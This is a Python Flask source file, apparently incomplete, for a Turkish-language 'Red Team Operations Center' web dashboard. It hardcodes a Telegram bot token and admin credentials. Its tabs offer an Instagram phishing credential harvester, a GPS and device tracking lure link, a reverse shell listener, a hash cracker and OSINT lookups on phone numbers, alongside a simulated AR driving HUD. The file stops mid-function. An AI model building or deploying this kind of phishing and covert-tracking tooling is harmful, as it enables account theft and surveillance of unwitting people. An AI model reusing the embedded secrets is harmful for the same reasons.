import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
CLICK_LOGS = []
CREDENTIAL_LOGS = []
CHAT_MESSAGES = []
DRIVING_SESSIONS = []
OSINT_LOGS = []
SCHEDULED_TARGETS = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "kali_linux_secret_key_998877"

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #121824; padding: 40px; border-radius: 6px; border: 1px solid #00ff66; box-shadow: 0 0 25px rgba(0,255,102,0.2); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; text-shadow: 0 0 10px rgba(56,189,248,0.4); }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 15px; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #00ff66; box-shadow: 0 0 8px rgba(0,255,102,0.4); }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; font-family: 'Courier New', Courier, monospace; transition: 0.2s; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>kali@root-terminal:~#</h2>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Username</label><input type="text" name="username" required autofocus></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center & Ultimate AR</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
        .container { max-width: 1380px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
        h1 { color: #38bdf8; margin: 0; font-size: 22px; text-shadow: 0 0 10px rgba(56,189,248,0.3); }
        .logout-btn { background: #991b1b; color: white; padding: 6px 14px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
        .logout-btn:hover { background: #7f1d1d; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; background: #0a0e17; padding: 8px; border-radius: 6px; border: 1px solid #1e293b; }
        .tab-btn { background: #1a2332; color: #94a3b8; border: 1px solid #283548; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 12px; font-family: 'Courier New', Courier, monospace; }
        .tab-btn:hover { background: #283548; color: #fff; }
        .tab-btn.active { background: #0284c7; color: white; border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
        label { color: #38bdf8; font-size: 13px; font-weight: bold; }
        input[type="text"], select, textarea, input[type="file"], input[type="number"], input[type="password"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
        textarea { resize: vertical; height: 100px; }
        button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        button.secondary { background: #0d9488; }
        button.success { background: #15803d; }
        button.danger { background: #b91c1c; }
        .terminal { background: #05070a; color: #00ff66; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 15px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.4; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0a0e17; border-radius: 6px; overflow: hidden; border: 1px solid #1e293b; }
        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; vertical-align: middle; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #161f30; }
        .mini-map { width: 160px; height: 100px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
        .snapshot-img { width: 90px; height: 65px; border-radius: 4px; border: 1px solid #334155; object-fit: cover; }
        
        /* Ultimate AR HUD Styles */
        .ar-container { position: relative; width: 100%; max-width: 800px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); }
        .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
        #arVideo { width: 100%; height: 480px; object-fit: cover; display: block; filter: brightness(100%) contrast(100%); }
        .ar-container:fullscreen #arVideo { height: 100vh; }
        #arCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        
        .ar-hud { position: absolute; top: 15px; left: 15px; right: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #00ff66; padding: 10px 15px; border-radius: 6px; font-size: 12px; color: #00ff66; z-index: 10; display: flex; justify-content: space-between; align-items: center; }
        .ar-speedlimit-hud { position: absolute; top: 75px; left: 15px; background: #ffffff; border: 3px solid #dc2626; color: #000; width: 45px; height: 45px; border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; font-weight: bold; font-size: 13px; z-index: 10; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
        .ar-weather-hud { position: absolute; top: 75px; right: 15px; background: rgba(11, 15, 21, 0.8); border: 1px solid #38bdf8; padding: 6px 10px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; }

        .ar-controls { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
        .ar-controls label { color: #e2e8f0; font-size: 12px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
        .ar-controls input[type="checkbox"] { accent-color: #00ff66; width: 15px; height: 15px; cursor: pointer; }
        
        .ar-log-box { background: #05070a; border: 1px solid #38bdf8; border-radius: 6px; padding: 12px; margin-top: 15px; max-height: 160px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; font-size: 12px; color: #38bdf8; }
        .chat-box { background: #05070a; border: 1px solid #1e293b; border-radius: 6px; padding: 15px; height: 350px; overflow-y: auto; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>kali@kali-linux:~/red-team-ops#</h1>
            <a href="/logout" class="logout-btn">[x] Logout</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
            <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 Ultimate AR HUD</button>
            <button class="tab-btn" onclick="switchTab('osintTab')">🕵️‍♂️ OSINT</button>
            <button class="tab-btn" onclick="switchTab('chatTab')">💬 Secure Chat</button>
            <button class="tab-btn" onclick="switchTab('snifferTab')">📊 Packet Sniffer</button>
            <button class="tab-btn" onclick="switchTab('drivingTab')">⛽ Sürüş Raporları & Kara Kutu</button>
            <button class="tab-btn" onclick="switchTab('phishTab')">📸 Phishing</button>
            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS Tracker</button>
            <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Cracker</button>
            <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
            <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
            <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi</button>
            <button class="tab-btn" onclick="switchTab('dataTab')">📁 Archive</button>
        </div>

        <!-- 1. Keşif -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group"><label>Target URL / IP:</label><input type="text" id="targetUrl" placeholder="example.com"></div>
            <button onclick="startScan(false)">Execute Comprehensive Recon</button>
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            <div class="actions" id="actionButtons" style="display:none; gap:10px; margin-top:15px;">
                <button class="secondary" onclick="downloadReport('txt')">📥 Save TXT</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 Export PDF</button>
                <button class="success" onclick="sendToTelegram()">📤 Send to Telegram</button>
            </div>
            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- ULTIMATE AR NAVİGASYON SEKMESİ -->
        <div id="arNavTab" class="tab-content">
            <h3>🧭 Ultimate AR HUD & Taktiksel Sürüş Konsolu</h3>
            <p style="color: #94a3b8; font-size: 13px;">Seçtiğin özellikler (Gece Görüşü, 0-100 Kronometre, Polarize Filtre vb.) tam entegre çalışır. Holografik yol çizgisi şerit zeminine kusursuz şekilde oturur.</p>
            
            <div class="ar-controls">
                <span style="color:#38bdf8; font-weight:bold;">Modül Kontrolleri:</span>
                <label><input type="checkbox" id="chkNightVision"> 🔦 Gece Görüşü / Termal</label>
                <label><input type="checkbox" id="chkDragTimer"> ⏱️ 0-100 Kronometre</label>
                <label><input type="checkbox" id="chkPolarize"> 🕶️ Polarize Filtre</label>
                <label><input type="checkbox" id="chkCompass"> Jiroskop & Pusula</label>
                <label><input type="checkbox" id="chkLane" checked> 🚧 Şerit Takip Asistanı</label>
                <label><input type="checkbox" id="chkSpatial" checked> Sesli Asistan</label>
            </div>

            <div class="form-group">
                <label>Hedef Operasyon / Rota:</label>
                <input type="text" id="arDestination" value="Saha Bölge Komuta Merkezi B-2">
            </div>
            
            <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;">
                <button class="success" onclick="startARCamera()">📸 AR Kamerayı Başlat</button>
                <button class="success" onclick="finishDrivingSession()">🏁 Sürüşü Bitir & Rapor Al</button>
                <button class="secondary" onclick="toggleFullScreen()">📺 Tam Ekran</button>
                <button class="success" onclick="takeSnapshot()">📷 Kanıt Al</button>
                <button class="danger" onclick="stopARCamera()">🛑 Kapat</button>
            </div>

            <div class="ar-container" id="arBox">
                <div class="ar-hud">
                    <span id="arHudText">Durum: Hazır</span>
                    <span id="arTelemetry" style="color: #38bdf8;">HIZ: 0 km/s | G: 1.0G</span>
                </div>
                <!-- Hız Limiti Dinamik Tablosu (Köşede küçük tabela) -->
                <div class="ar-speedlimit-hud">
                    <span style="font-size:9px; font-weight:bold; color:#666; margin-bottom:-2px;">AZAMİ</span>
                    <span>50</span>
                </div>
                <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Grip: %92</div>
                
                <video id="arVideo" autoplay playsinline muted></video>
                <canvas id="arCanvas"></canvas>
            </div>

            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Canlı Taktiksel Log Akışı & Kara Kutu Kayıtları:</h4>
            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Sürüş kara kutusu başlatıldı. Tüm veriler loglanıyor...</div>
        </div>

        <!-- OSINT Modülü -->
        <div id="osintTab" class="tab-content">
            <h3>🕵️‍♂️ OSINT Sosyal Medya & Telefon Numara İstihbaratı</h3>
            <div class="form-group"><label>Hedef Telefon / Kullanıcı Adı / E-Posta:</label><input type="text" id="osintTarget" placeholder="+905551234567 veya @hedef_kullanici"></div>
            <button class="success" onclick="runOsintScan()">OSINT Sorgulamasını Başlat</button>
            <div id="osintResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <!-- Secure WebChat -->
        <div id="chatTab" class="tab-content">
            <h3>💬 Dahili Encrypted Chat / Operasyon Haberleşme Odası</h3>
            <div id="chatBox" class="chat-box"><p style="color:#94a3b8;">Şifreli kanal aktif. Mesajlar bekleniyor...</p></div>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="chatInput" placeholder="Mesajınızı yazın..." style="flex:1;" onkeypress="if(event.key==='Enter') sendChatMessage()">
                <button class="success" onclick="sendChatMessage()">Gönder</button>
            </div>
        </div>

        <!-- Packet Sniffer -->
        <div id="snifferTab" class="tab-content">
            <h3>📊 Derin Ağ Trafik Simülasyonu (Packet Sniffer Visualizer)</h3>
            <p style="color: #94a3b8; font-size: 13px;">Ağ arayüzünden geçen anlık HTTP/TCP paket trafiğini gözlemleyin.</p>
            <button class="secondary" onclick="toggleSniffer()" id="snifferBtn">Canlı Trafik Dinleyicisini Başlat</button>
            <div id="snifferResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <!-- Sürüş Raporları & Kara Kutu -->
        <div id="drivingTab" class="tab-content">
            <h3>⛽ Sürüş Raporları & Kara Kutu (Blackbox) Arşivi</h3>
            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir" dediğinde oluşturulan detaylı raporları ve yakıt/menzil analizlerini buradan indirebilirsin.</p>
            <div id="drivingReportsContainer">
                <p style="color:#94a3b8;">Henüz kaydedilmiş bir sürüş raporu yok. Ultimate AR sekmesinden sürüşü başlatıp bitirebilirsiniz.</p>
            </div>
        </div>

        <!-- Diğer Standart Sekmeler -->
        <div id="phishTab" class="tab-content">
            <h3>📸 Instagram Phishing & Credential Harvester</h3>
            <div class="form-group"><label>Sahte Link:</label><input type="text" id="instaLink" readonly style="color: #38bdf8;"></div>
            <button class="success" onclick="generateInstaLink()">Link Üret</button>
            <div id="credsContainer" style="margin-top:15px;"><p style='color: #94a3b8;'>Yakalanan hesap yok.</p></div>
        </div>

        <div id="lureTab" class="tab-content">
            <h3>🎯 Gelişmiş GPS & Cihaz İstihbarat Tracker</h3>
            <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
            <div class="form-group" style="margin-top: 15px;"><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
            <div id="clickLogsContainer" style="margin-top:15px;"><p style='color: #94a3b8;'>Veri yok.</p></div>
        </div>

        <div id="crackerTab" class="tab-content">
            <h3>🔑 Hash Cracker</h3>
            <div class="form-group"><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
            <div class="form-group"><input type="text" id="targetHash" placeholder="Hash giriniz"></div>
            <div class="form-group"><textarea id="wordlistArea">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startHashCrack()">Hash Çöz</button>
            <div id="crackResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="shellListenerTab" class="tab-content">
            <h3>💻 Reverse Shell Dinleyicisi</h3>
            <div class="form-group"><input type="number" id="listenerPort" value="4444"></div>
            <button class="success" onclick="startListener()">Dinlemeyi Başlat</button>
            <div id="listenerStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="telegramTab" class="tab-content">
            <h3>🤖 Telegram Bot Tester</h3>
            <div class="form-group"><input type="text" id="testChatId" value="{{ default_chat_id }}"></div>
            <button class="success" onclick="sendTelegramTest()">Test Gönder</button>
            <div id="telegramTestStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="wifiTab" class="tab-content">
            <h3>📶 Wi-Fi Audit</h3>
            <button class="success" onclick="runWifiAction('scan')">Ağları Tara</button>
            <div id="wifiResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="dataTab" class="tab-content">
            <h3>📁 Archive Database</h3>
            <div id="databaseTableContainer">No archived data.</div>
        </div>
    </div>

    <script>
        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
        let arStream = null, arInterval = null, compassHeading = 0;
        let currentDistance = 150, currentSpeed = 0, currentGForce = 1.0, currentLeanAngle = 0;
        let sessionLogs = [], snifferActive = false, snifferInterval = null;

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            if(tabId === 'drivingTab') loadDrivingReports();
            if(tabId === 'chatTab') loadChatMessages();
            if(tabId !== 'arNavTab') stopARCamera();
        }

        function handleOrientation(event) {
            if (event.alpha !== null) compassHeading = Math.round(event.alpha);
        }

        function speakSpatial(text) {
            if (document.getElementById('chkSpatial').checked && 'speechSynthesis' in window) {
                let utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'tr-TR';
                utterance.rate = 1.0;
                window.speechSynthesis.speak(utterance);
            }
        }

        function toggleFullScreen() {
            let elem = document.getElementById('arBox');
            if (!document.fullscreenElement) {
                if (elem.requestFullscreen) elem.requestFullscreen();
            } else {
                if (document.exitFullscreen) document.exitFullscreen();
            }
        }

        function takeSnapshot() {
            let video = document.getElementById('arVideo');
            let canvas = document.getElementById('arCanvas');
            if (!video.srcObject) { alert("Kamera açık değil!"); return; }
            let snapCanvas = document.createElement('canvas');
            snapCanvas.width = video.videoWidth || 640;
            snapCanvas.height = video.videoHeight || 480;
            let sCtx = snapCanvas.getContext('2d');
            sCtx.drawImage(video, 0, 0, snapCanvas.width, snapCanvas.height);
            sCtx.drawImage(canvas, 0, 0, snapCanvas.width, snapCanvas.height);

            let a = document.createElement('a');
            a.href = snapCanvas.toDataURL('image/png');
            a.download = `AR_TACTICAL_PROOF_${Date.now()}.png`;
            a.click();
            speakSpatial("Kanıt görüntüsü kaydedildi.");
        }

        // --- ULTIMATE AR MOTORU & YENİ ÖZELLİKLER ---
        async function startARCamera() {
            let video = document.getElementById('arVideo');
            let hud = document.getElementById('arHudText');
            let telemetry = document.getElementById('arTelemetry');
            let canvas = document.getElementById('arCanvas');
            let logTerminal = document.getElementById('arLogTerminal');
            let dest = document.getElementById('arDestination').value || 'Hedef';

            sessionLogs = [];
            let startTime = new Date().toLocaleTimeString();

            if (document.getElementById('chkCompass').checked) {
                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                    try { await DeviceOrientationEvent.requestPermission(); } catch(e){}
                }
                window.addEventListener('deviceorientation', handleOrientation, true);
            }

            try {
                arStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
            } catch (err) {
                try { arStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } 
                catch (e) { alert("Kamera erişimi sağlanamadı!"); return; }
            }

            video.srcObject = arStream;
            hud.innerText = "HUD Aktif: Rota Çiziliyor";
            speakSpatial("Ultimate AR Navigasyon başlatıldı.");

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            let ctx = canvas.getContext('2d');

            let step = 0;
            let dragStartTime = null;
            let dragTimerRunning = false;

            arInterval = setInterval(() => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                let w = canvas.width;
                let h = canvas.height;

                // 1. Gece Görüşü / Termal Filtre (Seçilince Açılır)
                let useNightVision = document.getElementById('chkNightVision').checked;
                if (useNightVision) {
                    video.style.filter = "brightness(140%) contrast(150%) sepia(100%) hue-rotate(70deg) saturate(300%)";
                } else {
                    video.style.filter = "none";
                }

                // 2. Polarize Gözlük Filtre Uyumu (Seçilince Açılır)
                let usePolarize = document.getElementById('chkPolarize').checked;
                if (usePolarize) {
                    ctx.fillStyle = 'rgba(56, 189, 248, 0.08)';
                    ctx.fillRect(0, 0, w, h);
                }

                // Köşe Nişangahları
                ctx.strokeStyle = useNightVision ? '#00ff66' : '#38bdf8';
                ctx.lineWidth = 2;
                ctx.strokeRect(25, 25, 35, 15); ctx.strokeRect(25, 25, 15, 35);
                ctx.strokeRect(w - 60, 25, 35, 15); ctx.strokeRect(w - 40, 25, 15, 35);

                // --- 🎮 HOLOGRAFİK YOL ÇİZGİSİ PROJEKSİYONU (GHOST TRAIL) ---
                let centerX = (w / 2) + (document.getElementById('chkCompass').checked ? Math.sin(compassHeading * Math.PI / 180) * 30 : 0);
                let bottomY = h;
                let horizonY = h * 0.5;

                ctx.beginPath();
                ctx.moveTo(centerX - 55, bottomY);
                ctx.lineTo(centerX + 55, bottomY);
                for (let y = bottomY; y >= horizonY; y -= 8) {
                    let wave = Math.sin((y + step * 6) * 0.03) * 10;
                    let factor = (bottomY - y) / (bottomY - horizonY);
                    let curW = 55 * (1 - factor * 0.8);
                    ctx.lineTo(centerX + wave + curW, y);
                }
                for (let y = horizonY; y <= bottomY; y += 8) {
                    let wave = Math.sin((y + step * 6) * 0.03) * 10;
                    let factor = (bottomY - y) / (bottomY - horizonY);
                    let curW = 55 * (1 - factor * 0.8);
                    ctx.lineTo(centerX + wave - curW, y);
                }
                ctx.closePath();
                let trailGrad = ctx.createLinearGradient(0, horizonY, 0, bottomY);
                trailGrad.addColorStop(0, 'rgba(0, 255, 102, 0.05)');
                trailGrad.addColorStop(0.7, 'rgba(0, 255, 102, 0.4)');
                trailGrad.addColorStop(1, 'rgba(0, 255, 102, 0.85)');
                ctx.fillStyle = trailGrad;
                ctx.shadowColor = '#00ff66';
                ctx.shadowBlur = 15;
                ctx.fill();

                // Yol Üzerinde Akan Işık Okları
                let arrowY = bottomY - ((step * 6) % (bottomY - horizonY));
                if (arrowY > horizonY) {
                    ctx.fillStyle = '#ffffff';
                    ctx.beginPath();
                    ctx.moveTo(centerX, arrowY - 10);
                    ctx.lineTo(centerX - 8, arrowY + 4);
                    ctx.lineTo(centerX + 8, arrowY + 4);
                    ctx.closePath();
                    ctx.fill();
                }

                // 3. 0-100 Kronometre (Seçilince Çalışır)
                let useDrag = document.getElementById('chkDragTimer').checked;
                if (useDrag) {
                    if (!dragTimerRunning) {
                        dragTimerRunning = true;
                        dragStartTime = Date.now();
                        currentSpeed = 0;
                    }
                    if (currentSpeed < 100) {
                        currentSpeed += 4;
                        let elapsed = ((Date.now() - dragStartTime) / 1000).toFixed(1);
                        ctx.fillStyle = '#facc15';
                        ctx.font = 'bold 14px Courier New';
                        ctx.fillText(`⏱️ 0-100 DRAG: ${elapsed}s (${currentSpeed} km/s)`, w / 2 - 110, 50);
                    }
                } else {
                    dragTimerRunning = false;
                    currentSpeed = 35; // Sabit sürüş hızı simülasyonu
                }

                // 4. G-Kuvveti ve Eğim Ölçer (Inclinometer & G-Force)
                currentGForce = (1.0 + Math.sin(step * 0.1) * 0.3).toFixed(1);
                currentLeanAngle = Math.round(Math.sin(step * 0.05) * 25);

                // 5. Şerit Takip Asistanı (Lane Departure Warning)
                let useLane = document.getElementById('chkLane').checked;
                if (useLane && Math.abs(currentLeanAngle) > 20) {
                    ctx.strokeStyle = '#ef4444';
                    ctx.lineWidth = 4;
                    ctx.strokeRect(10, 10, w - 20, h - 20);
                    hud.innerText = "⚠️ ŞERİT İHLALİ / AŞIRI YATIŞ!";
                } else {
                    if (step % 50 === 25) {
                        if (currentDistance > 5) currentDistance -= 2;
                        hud.innerText = `🧭 Hedefe Kalan: ${currentDistance}m | Eğim: ${currentLeanAngle}°`;
                    }
                }

                telemetry.innerText = `HIZ: ${currentSpeed} km/s | G: ${currentGForce}G`;

                // Log kaydı oluştur
                if (step % 40 === 0) {
                    let t = new Date().toLocaleTimeString();
                    let logStr = `[${t}] Hız: ${currentSpeed}km/s | Eğim: ${currentLeanAngle}° | G: ${currentGForce}G | Mesafe: ${currentDistance}m`;
                    sessionLogs.push(logStr);
                    logTerminal.innerHTML += `<br>` + logStr;
                    logTerminal.scrollTop = logTerminal.scrollHeight;
                }

                step++;
            }, 80);
        }

        function stopARCamera() {
            if (arStream) { arStream.getTracks().forEach(t => t.stop()); arStream = null; }
            if (arInterval) { clearInterval(arInterval); arInterval = null; }
            window.removeEventListener('deviceorientation', handleOrientation, true);
            let video = document.getElementById('arVideo');
            video.srcObject = null;
            video.style.filter = "none";
            document.getElementById('arHudText').innerText = "Durum: Kapalı";
        }

        // --- SÜRÜŞ RAPORLARI & KARA KUTU ---
        async function finishDrivingSession() {
            stopARCamera();
            if(sessionLogs.length === 0) { alert("Kaydedilmiş sürüş verisi yok!"); return; }
            let sessionData = {
                time: new Date().toLocaleString(),
                logs: sessionLogs
            };
            let res = await fetch('/api/driving/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sessionData) });
            let data = await res.json();
            alert("Sürüş tamamlandı! 'Sürüş Raporları' sekmesinden kara kutu raporunu indirebilirsin.");
            switchTab('drivingTab');
        }

        async function loadDrivingReports() {
            let res = await fetch('/api/driving/reports');
            let data = await res.json();
            let container = document.getElementById('drivingReportsContainer');
            if(data.reports.length === 0) { container.innerHTML = "<p style='color:#94a3b8;'>Henüz rapor yok.</p>"; return; }
            let html = `<table><thead><tr><th>Tarih & Saat</th><th>Toplam Log Kaydı</th><th>Kara Kutu Dosyası</th></tr></thead><tbody>`;
            data.reports.forEach((r, idx) => {
                html += `<tr><td>${r.time}</td><td>${r.logs.length} satır telemetri</td><td><a href="/api/driving/download?index=${idx}" target="_blank"><button class="success">📥 Raporu İndir (.TXT)</button></a></td></tr>`;
            });
            html += `</tbody></table>`;
            container.innerHTML = html;
        }

        // --- OSINT MODÜLÜ ---
        async function runOsintScan() {
            let target = document.getElementById('osintTarget').value.trim();
            let resDiv = document.getElementById('osintResults');
            if(!target) { alert('Hedef giriniz!'); return; }
            resDiv.style.display = "block";
            resDiv.innerHTML = `root@kali:~# osint-scanner --target "${target}" --deep-scan\n[+] Veritabanları taranıyor...\n[+] Sosyal medya ayak izleri çıkarılıyor...`;
            let res = await fetch('/api/osint', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target}) });
            let data = await res.json();
            resDiv.innerHTML = data.output;
        }

        // --- SECURE WEBCHAT ---
        async function loadChatMessages() {
            let res = await fetch('/api/chat/messages');
            let data = await res.json();
            let box = document.getElementById('chatBox');
            if(data.messages.length === 0) { box.innerHTML = "<p style='color:#94a3b8;'>Şifreli kanal boş.</p>"; return; }
            box.innerHTML = data.messages.map(m => `<div><span style="color:#38bdf8;">[${m.time}]</span> <b>${m.user}:</b> ${m.text}</div>`).join('');
            box.scrollTop = box.scrollHeight;
        }
        async function sendChatMessage() {
            let input = document.getElementById('chatInput');
            let text = input.value.trim();
            if(!text) return;
            await fetch('/api/chat/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({text}) });
            input.value = "";
            loadChatMessages();
        }

        // --- PACKET SNIFFER ---
        function toggleSniffer() {
            let btn = document.getElementById('snifferBtn');
            let resDiv = document.getElementById('snifferResults');
            if (!snifferActive) {
                snifferActive = true;
                btn.innerText = "Canlı Trafik Dinleyicisini Durdur";
                btn.className = "danger";
                resDiv.style.display = "block";
                resDiv.innerHTML = "root@kali:~# tcpdump -i any -nnvvS\n[+] Paket yakalama motoru devrede...\n";
                snifferInterval = setInterval(() => {
                    let fakeIps = ["192.168.1.35", "10.0.0.4", "172.16.8.9", "127.0.0.1"];
                    let src = fakeIps[Math.floor(Math.random()*fakeIps.length)];
                    let t = new Date().toLocaleTimeString();
                    resDiv.innerHTML += `[${t]} IP ${src}.443 > 10.0.0.1.52412: Flags [P.], cksum 0x2a1b (correct), seq 1254:1420, length 166\n`;
                    resDiv.scrollTop = resDiv.scrollHeight;
                }, 1500);
            } else {
                snifferActive = false;
                clearInterval(snifferInterval);
                btn.innerText = "Canlı Trafik Dinleyicisini Başlat";
                btn.className = "secondary";
                resDiv.innerHTML += "\n[-] Dinleyici durduruldu.";
            }
        }

        // Standart fonksiyonlar
        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            if(!url) { alert('Specify target!'); return; }
            lastTarget = url;
            let statusDiv = document.getElementById('status'), resultsDiv = document.getElementById('results');
            statusDiv.innerHTML = `root@kali:~# scanning ${url}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report; currentReportText = data.report; document.getElementById('actionButtons').style.display = "flex";
        }
        function generateInstaLink() { document.getElementById('instaLink').value = window.location.origin + "/phish/instagram"; alert("Link üretildi!"); }
        function generateLureLink() { document.getElementById('generatedLink').value = window.location.origin + "/track/" + Math.random().toString(36).substring(2,9); alert("Takip linki üretildi!"); }
        async function startHashCrack() {
